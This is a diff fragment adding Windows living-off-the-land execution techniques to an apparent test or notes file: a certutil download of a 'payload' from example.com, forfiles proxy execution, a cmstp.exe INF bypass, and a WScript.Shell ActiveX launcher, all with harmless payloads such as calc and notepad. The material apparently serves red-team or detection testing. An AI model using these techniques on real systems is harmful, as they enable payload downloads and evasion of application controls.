@@ -69,3 +69,45 @@ End Sub
 C:\Windows\System32\certutil.exe -urlcache -split -f https://example.com/payload.html C:\tester\payload.html
 
 
+
+
+
+
+
+
+
+
+forfiles /p C:\Windows\System32 /m klist.exe /c "cmd /c klist > C:\tester\klistout.txt"
+forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c calc"
+
+Start--
+[version]
+Signature=$CHICAGO$
+
+[DefaultInstall]
+CustomDestination = CustInstDestSectionAllUsers
+RunPreSetupCommands = RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+notepad.exe
+
+[CustInstDestSectionAllUsers]
+49000,49001=C:\MyFolder
+
+[Strings]
+ServiceName="EvilService"
+ShortSvcName="EvilSvc"
+end--
+
+cmstp.exe /s C:\MyFolder\evil.inf
+
+
+
+
+<script>
+  var shell = new ActiveXObject("WScript.Shell");
+  shell.Run("notepad.exe");
+</script>
+
+
+
